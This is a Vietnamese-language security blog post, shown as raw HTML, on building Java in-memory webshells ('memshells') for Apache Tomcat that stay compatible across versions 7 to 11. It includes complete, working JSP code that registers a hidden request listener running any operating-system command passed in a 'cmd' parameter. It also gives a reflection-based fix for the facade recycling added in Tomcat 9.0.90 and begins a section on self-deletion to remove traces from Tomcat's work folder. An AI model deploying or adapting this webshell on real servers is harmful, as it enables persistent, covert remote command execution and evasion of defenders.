<!DOCTYPE html>
<html lang="vi-vn">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Level-up Java Memshell - Facing Tomcat Compatibility Problems | devme4f&#39;s blog</title>
  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2024/java-memshell-facing-tomcat-compatibility/'>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Level-up Java Memshell - Facing Tomcat Compatibility Problems" />
<meta property="og:description" content="The knowledge is endless, don&rsquo;t just learn it, do it
preface Trước đây mình đã viết một bài khá basic về 3 loại memshell trên tomcat, đây vẫn chưa phải tất cả các thành phần có thể lợi dụng, còn các loại khác như Valve, Executor, Poller, Http11NioProtocol,&hellip; (chưa kể framework như spring hay các webserver servlet khác) nhưng để phân loại theo các cách inject vào memory từ exec code, ta có ba loại:" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://devme4f.github.io/posts/2024/java-memshell-facing-tomcat-compatibility/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-12-31T19:56:07+07:00" />
<meta property="article:modified_time" content="2024-12-31T19:56:07+07:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Level-up Java Memshell - Facing Tomcat Compatibility Problems"/>
<meta name="twitter:description" content="The knowledge is endless, don&rsquo;t just learn it, do it
preface Trước đây mình đã viết một bài khá basic về 3 loại memshell trên tomcat, đây vẫn chưa phải tất cả các thành phần có thể lợi dụng, còn các loại khác như Valve, Executor, Poller, Http11NioProtocol,&hellip; (chưa kể framework như spring hay các webserver servlet khác) nhưng để phân loại theo các cách inject vào memory từ exec code, ta có ba loại:"/>

  
  
    
  
  
  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/notes">Notes</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://devme4f.github.io/notes/2024/so-hai-den-bao-gio/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://devme4f.github.io/notes/2025/waves/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&text=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&title=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&is_video=false&description=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&title=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&title=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&name=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems&description=The%20knowledge%20is%20endless%2c%20don%26rsquo%3bt%20just%20learn%20it%2c%20do%20it%0apreface%20Tr%c6%b0%e1%bb%9bc%20%c4%91%c3%a2y%20m%c3%acnh%20%c4%91%c3%a3%20vi%e1%ba%bft%20m%e1%bb%99t%20b%c3%a0i%20kh%c3%a1%20basic%20v%e1%bb%81%203%20lo%e1%ba%a1i%20memshell%20tr%c3%aan%20tomcat%2c%20%c4%91%c3%a2y%20v%e1%ba%abn%20ch%c6%b0a%20ph%e1%ba%a3i%20t%e1%ba%a5t%20c%e1%ba%a3%20c%c3%a1c%20th%c3%a0nh%20ph%e1%ba%a7n%20c%c3%b3%20th%e1%bb%83%20l%e1%bb%a3i%20d%e1%bb%a5ng%2c%20c%c3%b2n%20c%c3%a1c%20lo%e1%ba%a1i%20kh%c3%a1c%20nh%c6%b0%20Valve%2c%20Executor%2c%20Poller%2c%20Http11NioProtocol%2c%26hellip%3b%20%28ch%c6%b0a%20k%e1%bb%83%20framework%20nh%c6%b0%20spring%20hay%20c%c3%a1c%20webserver%20servlet%20kh%c3%a1c%29%20nh%c6%b0ng%20%c4%91%e1%bb%83%20ph%c3%a2n%20lo%e1%ba%a1i%20theo%20c%c3%a1c%20c%c3%a1ch%20inject%20v%c3%a0o%20memory%20t%e1%bb%ab%20exec%20code%2c%20ta%20c%c3%b3%20ba%20lo%e1%ba%a1i%3a" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2fjava-memshell-facing-tomcat-compatibility%2f&t=Level-up%20Java%20Memshell%20-%20Facing%20Tomcat%20Compatibility%20Problems" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">preface</a></li>
    <li><a href="#jsp-type">JSP type</a>
      <ul>
        <li><a href="#fix-compatibility-issues-with-tomcat--9090">fix compatibility issues with tomcat &gt; 9.0.90</a></li>
        <li><a href="#self-deletion">self-deletion</a></li>
      </ul>
    </li>
    <li><a href="#vulnerabilities-type">vulnerabilities type</a>
      <ul>
        <li><a href="#obtain-requestresponse-object---tomcat-echo-7-9">obtain request/response object - Tomcat echo 7-9</a></li>
        <li><a href="#fix-compatibility-issues-with-tomcat-10-11">fix compatibility issues with tomcat 10, 11</a></li>
        <li><a href="#merge-poc-obtain-standardcontext-and-inject-memshell">merge PoC, obtain StandardContext and inject memshell</a></li>
        <li><a href="#inject-memshell-via-deser-gadget-chain">inject memshell via deser gadget chain</a></li>
      </ul>
    </li>
    <li><a href="#weaponize">weaponize</a></li>
    <li><a href="#after-word">after word</a></li>
    <li><a href="#refs">refs</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Level-up Java Memshell - Facing Tomcat Compatibility Problems
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2024-12-31 19:56:07 &#43;0700 &#43;07" itemprop="datePublished">2024-12-31</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/memshell" rel="tag">memshell</a>
            
             ,  
            <a class="tag-link" href="/tags/tomcat" rel="tag">tomcat</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p>The knowledge is endless, don&rsquo;t just learn it, do it</p>
<h2 id="preface">preface</h2>
<p>Trước đây mình đã viết một bài khá <a href="https://sec.vnpt.vn/2022/12/ky-thuat-memory-webshell-trong-cac-dot-khai-thac-redteam/">basic về 3 loại memshell trên tomcat</a>, đây vẫn chưa phải tất cả các thành phần có thể lợi dụng, còn các loại khác như Valve, Executor, Poller, Http11NioProtocol,&hellip; (chưa kể framework như spring hay các webserver servlet khác) nhưng để phân loại theo các cách inject vào memory từ exec code, ta có ba loại:</p>
<ul>
<li>Loại thứ nhất thì khá đơn giản, drop file jsp/jspx vào webroot để được execute. Nếu app chạy springmvc và deploy trên tomcat webroot, cũng có thể drop file inject vào tomcat thay vì qua loại hai.</li>
<li>Loại thứ hai ở đây là exploit app có các bug như EL Injection, Deserialization hay JNDI Injection  thì có thể tạo expression hay modify lại gadget chain để inject memshell.</li>
<li>Và cuối cùng, nếu app không có bug nào, tomcat webroot không write được, nhưng ta lại có access vào server, muốn inject memshell để persistent, có thể execute Java Agent qua CLI để chèn memshell vào process JVM mong muốn.</li>
</ul>
<p>Tuy nhiên yếu tố tương thích cũng rất quan trọng, do vòng đời một sản phẩm thường trải qua nhiều thay đổi, khi chạy có thể dùng nhiều cấu hình khác nhau. Bài viết này sẽ tập trung tìm hiểu và phát triển memshell tối ưu, tương thích với nhiều version của tomcat (từ 7-11) để có thể tái sử dụng nhiều lần, hạn chế phải test/fix lỗi trước mỗi lần sử dụng cho từng loại được inject. Do bài khá dài, mình chỉ dừng lại ở hai loại đầu, inject memshell qua java agent sẽ có một bài riêng.</p>
<ul>
<li>Tomcat archives: <a href="https://archive.apache.org/dist/tomcat/">https://archive.apache.org/dist/tomcat/</a></li>
<li>Which version: <a href="https://tomcat.apache.org/whichversion.html">https://tomcat.apache.org/whichversion.html</a></li>
</ul>
<h2 id="jsp-type">JSP type</h2>
<p>Mình đã dùng qua 3 loại <code>listener/filter/servlet</code>. Cá nhân mình thấy <code>listener</code> là loại có thể inject đơn giản nhất, ngoài ra các internal method ít bị thay đổi để gây ảnh hưởng trong quá trình inject. Cùng bắt đầu với một memshell listener basic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span><span style="color:#a6e22e">@page</span> import<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;java.lang.reflect.Field&#34;</span> <span style="color:#f92672">%&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span><span style="color:#a6e22e">@page</span> import<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationContextFacade&#34;</span> <span style="color:#f92672">%&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span><span style="color:#a6e22e">@page</span> import<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationContext&#34;</span> <span style="color:#f92672">%&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span><span style="color:#a6e22e">@page</span> import<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;org.apache.catalina.core.StandardContext&#34;</span> <span style="color:#f92672">%&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span><span style="color:#960050;background-color:#1e0010">@</span> page import<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;java.io.BufferedReader&#34;</span> <span style="color:#f92672">%&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span><span style="color:#960050;background-color:#1e0010">@</span> page import<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;java.io.InputStreamReader&#34;</span> <span style="color:#f92672">%&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%!</span>
</span></span><span style="display:flex;"><span>    String pwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EventListener</span> <span style="color:#66d9ef">implements</span> ServletRequestListener <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> HttpServletResponse response<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// custom constructor
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">EventListener</span><span style="color:#f92672">(</span>HttpServletResponse response<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> response<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">requestDestroyed</span><span style="color:#f92672">(</span>ServletRequestEvent sre<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">requestInitialized</span><span style="color:#f92672">(</span>ServletRequestEvent sre<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;request Initialized&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                HttpServletRequest request <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HttpServletRequest<span style="color:#f92672">)</span> sre<span style="color:#f92672">.</span><span style="color:#a6e22e">getServletRequest</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    Process ps <span style="color:#f92672">=</span> Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>                    BufferedReader br <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> InputStreamReader<span style="color:#f92672">(</span>ps<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()));</span>
</span></span><span style="display:flex;"><span>                    ServletOutputStream out <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">response</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    String s <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    String output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>s <span style="color:#f92672">=</span> br<span style="color:#f92672">.</span><span style="color:#a6e22e">readLine</span><span style="color:#f92672">())</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                        output <span style="color:#f92672">+=</span> s <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                    out<span style="color:#f92672">.</span><span style="color:#a6e22e">print</span><span style="color:#f92672">(</span>output<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                    out<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                    out<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    StandardContext <span style="color:#a6e22e">getStdCtx</span><span style="color:#f92672">(</span>ServletRequest request<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            Field appCtxFacadeField <span style="color:#f92672">=</span> ApplicationContextFacade<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;context&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            appCtxFacadeField<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            Field appCtxField <span style="color:#f92672">=</span> ApplicationContext<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;context&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            appCtxField<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>StandardContext<span style="color:#f92672">)</span> appCtxField<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>appCtxFacadeField<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getServletContext</span><span style="color:#f92672">()));</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;%</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        StandardContext stdCtx <span style="color:#f92672">=</span> getStdCtx<span style="color:#f92672">(</span>request<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        stdCtx<span style="color:#f92672">.</span><span style="color:#a6e22e">addApplicationEventListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> EventListener<span style="color:#f92672">(</span>response<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span><span style="color:#a6e22e">getWriter</span><span style="color:#f92672">().</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;done!&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%&gt;</span>
</span></span></code></pre></div><p>Do trên jsp page có hỗ trợ các <a href="https://docs.oracle.com/cd/E13222_01/wls/docs51/intro/intro_jsp.html#:~:text=The%20request%20and%20response%20variables,http%20package.">Implicit Variables</a> nên dễ dàng có được <code>request</code>, <code>response</code> object (nên nhớ các biến này chỉ là object Facade), từ object này lại dễ dàng lấy được <code>StandardObject</code> thông qua reflection để inject listener, khá ngắn gọn. Mình test trên tomcat 7, 8 chạy đều ổn, mỗi version test nhiều hơn 3 bản release (ex <code>7.0.1</code>, <code>7.0.55</code> và <code>7.0.99</code> để cover tổng thể)</p>
<h3 id="fix-compatibility-issues-with-tomcat--9090">fix compatibility issues with tomcat &gt; 9.0.90</h3>
<p>Trên tomcat 9, từ version <code>9.0.1</code> đến <code>9.0.89</code> chạy ổn, cho đến <code>9.0.90</code> khi sử dụng shell trên sẽ có lỗi:</p>
<pre tabindex="0"><code>java.lang.IllegalStateException: The response object has been recycled and is no longer associated with this facade
</code></pre><p>Sau tìm hiểu, mình nhận thấy nguyên nhân do <a href="https://tomcat.apache.org/tomcat-9.0-doc/changelog.html#:~:text=The%20system%20property%20org.apache.catalina.connector.RECYCLE_FACADES%20will%20now%20default%20to%20true">từ version 9.0.90</a>, attribute <code>RECYCLE_FACADES</code> mặc định được set default là <code>true</code>.Tức các <code>Facade</code> object từ nay mặc định sẽ được recycled khi một request hoàn thành, không thể tái sử dụng từ request này qua request khác như shell trên ta đang dùng nữa (lấy <code>responseFacade</code> từ request inject memshell và gán vào class listener để tái sử dụng nhiều lần)</p>
<p>Bản chất <code>ResponseFacade</code> cũng chỉ là class (mặt nạ) chứa <code>Response</code> class thật, tomcat sử dụng lớp facade này để check luồng, lỗi,.v.v khi xử lý rồi gọi đến <code>Response</code> class để thực hiện tác vụ, do đó, trong shell trên ta có thể sử dụng trực tiếp <code>Response</code> object thay vì <code>ResponseFacade</code> mặc định nữa (cả hai cũng chỉ đang implements <code>HttpServletResponse</code> nên không có xung đột gì đáng kể), fix:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    StandardContext stdCtx <span style="color:#f92672">=</span> getStdCtx<span style="color:#f92672">(</span>request<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Field res1 <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;response&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    res1<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    Response res  <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Response<span style="color:#f92672">)</span>res1<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>response<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    stdCtx<span style="color:#f92672">.</span><span style="color:#a6e22e">addApplicationEventListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> EventListener<span style="color:#f92672">(</span>res<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span><span style="color:#a6e22e">getWriter</span><span style="color:#f92672">().</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;done!&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>Đến đây shell jsp trên chạy tốt ở tomcat 7,8,9 và cả 10, 11.</p>
<h3 id="self-deletion">self-deletion</h3>
<p>Trong quá trình compile file <code>.jsp</code> ở webroot, tomcat sẽ generate thêm các file <code>.java</code> và <code>.class</code>:
<img src="/images/2024/Java-Memshell-Facing-Tomcat-compatibility/jsp_java_class.png" alt="jsp_java_class"></p>
<p>Các file này nằm trong folder <code>work</code> của tomcat:
<img src="/images/2024/Java-Memshell-Facing-Tomcat-compatibility/work_folder.png" alt="work_folder"></p>
